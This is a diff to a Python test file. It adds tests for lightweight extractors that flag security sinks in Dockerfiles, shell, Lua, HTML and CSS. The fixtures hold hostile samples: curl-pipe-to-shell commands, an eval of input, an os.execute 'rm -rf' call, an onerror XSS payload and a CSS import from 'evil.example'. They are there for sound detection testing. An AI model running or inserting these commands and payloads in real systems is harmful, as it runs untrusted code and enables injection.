@@ -34,7 +34,22 @@ needs_treesitter = pytest.mark.skipif(
     ("index.php", "php"),
     ("main.py", "python"),
     ("util.java", "java"),
-    ("style.css", None),
+    # Lightweight (regex-based) extractors are now first-class languages.
+    ("style.css", "css"),
+    ("theme.scss", "css"),
+    ("deploy.sh", "shell"),
+    ("hook.bash", "shell"),
+    ("script.lua", "lua"),
+    ("index.html", "html"),
+    ("page.htm", "html"),
+    ("card.tpl", "html"),
+    # Dockerfiles are matched by basename, not extension.
+    ("Dockerfile", "dockerfile"),
+    ("Dockerfile.prod", "dockerfile"),
+    ("path/to/Dockerfile", "dockerfile"),
+    # Genuinely unsupported.
+    ("notes.txt", None),
+    ("data.json", None),
 ])
 def test_language_for_file(filename, expected):
     assert language_for_file(filename) == expected
@@ -42,6 +57,11 @@ def test_language_for_file(filename, expected):
 
 def test_supported_languages_includes_new():
     for lang in ("go", "ruby", "php"):
+        assert lang in SUPPORTED_LANGUAGES
+
+
+def test_supported_languages_includes_lightweight():
+    for lang in ("dockerfile", "shell", "lua", "html", "css"):
         assert lang in SUPPORTED_LANGUAGES
 
 
@@ -423,3 +443,107 @@ def test_empty_index_has_exports_and_import_targets():
     idx = index_file("unknown.xyz", "unknown")
     assert idx["exports"] == []
     assert idx["import_targets"] == []
+
+
+# ---------------------------------------------------------------------------
+# Lightweight regex extractors (Dockerfile / shell / Lua / HTML / CSS)
+#
+# These run regardless of tree-sitter availability, so no needs_treesitter
+# marker. They assert the security-relevant sinks each extractor is meant to
+# surface and the common index shape downstream consumers rely on.
+# ---------------------------------------------------------------------------
+
+def _sink_kinds(idx) -> set[str]:
+    return {s["kind"] for s in idx["security_sinks"]}
+
+
+def test_lightweight_index_common_shape():
+    idx = index_file("deploy.sh", "shell", source=b"#!/bin/bash\necho hi\n")
+    for key in (
+        "file_path", "language", "total_functions", "total_lines",
+        "functions", "entry_points", "security_sinks", "call_sites",
+        "imports", "import_targets", "exports", "classes",
+    ):
+        assert key in idx, f"lightweight index missing {key}"
+    assert idx["language"] == "shell"
+
+
+def test_dockerfile_extractor_flags_root_and_remote_pipe():
+    source = b"""\
+FROM ubuntu:22.04
+RUN curl -fsSL https://example.com/install.sh | sh
+USER root
+ENV API_KEY=supersecret
+EXPOSE 8080
+CMD ["/bin/app"]
+"""
+    idx = index_file("Dockerfile", "dockerfile", source=source)
+    kinds = _sink_kinds(idx)
+    assert "container_runs_as_root" in kinds
+    assert "remote_pipe_to_shell" in kinds
+    assert "embedded_secret_env" in kinds
+    assert "exposed_port" in kinds
+    # CMD is an entry point and the base image is an import.
+    assert any(e["kind"] == "container_cmd" for e in idx["entry_points"])
+    assert "ubuntu:22.04" in idx["imports"]
+
+
+def test_dockerfile_extractor_flags_missing_user_directive():
+    source = b"FROM alpine:3.19\nRUN echo hello\n"
+    idx = index_file("Dockerfile", "dockerfile", source=source)
+    assert "missing_user_directive" in _sink_kinds(idx)
+
+
+def test_shell_extractor_functions_and_sinks():
+    source = b"""\
+#!/bin/bash
+deploy() {
+    eval "$1"
+    curl https://x/y | bash
+}
+"""
+    idx = index_file("deploy.sh", "shell", source=source)
+    kinds = _sink_kinds(idx)
+    assert "shell_eval" in kinds
+    assert "remote_pipe_to_shell" in kinds
+    assert any(f["name"] == "deploy" for f in idx["functions"])
+    assert any(e["kind"] == "shell_script" for e in idx["entry_points"])
+
+
+def test_lua_extractor_redis_and_exec_sinks():
+    source = b"""\
+local function handler(key)
+    redis.call('SET', KEYS[1], ARGV[1])
+    os.execute('rm -rf /tmp/x')
+end
+"""
+    idx = index_file("script.lua", "lua", source=source)
+    kinds = _sink_kinds(idx)
+    assert "redis_call" in kinds
+    assert "redis_keys_input" in kinds
+    assert "os_execute" in kinds
+    assert any(f["name"] == "handler" for f in idx["functions"])
+
+
+def test_html_extractor_form_and_template_sinks():
+    source = b"""\
+<form action="/login" method="post"></form>
+<div>{{ user.name }}</div>
+<img src=x onerror="alert(1)">
+"""
+    idx = index_file("index.html", "html", source=source)
+    kinds = _sink_kinds(idx)
+    assert "template_interpolation" in kinds
+    assert "inline_event_handler" in kinds
+    assert any(e["kind"] == "html_form" for e in idx["entry_points"])
+
+
+def test_css_extractor_external_import_and_expression():
+    source = b"""\
+@import url('http://evil.example/x.css');
+.x { width: expression(alert(1)); }
+"""
+    idx = index_file("style.css", "css", source=source)
+    kinds = _sink_kinds(idx)
+    assert "external_css_import" in kinds
+    assert "css_expression" in kinds
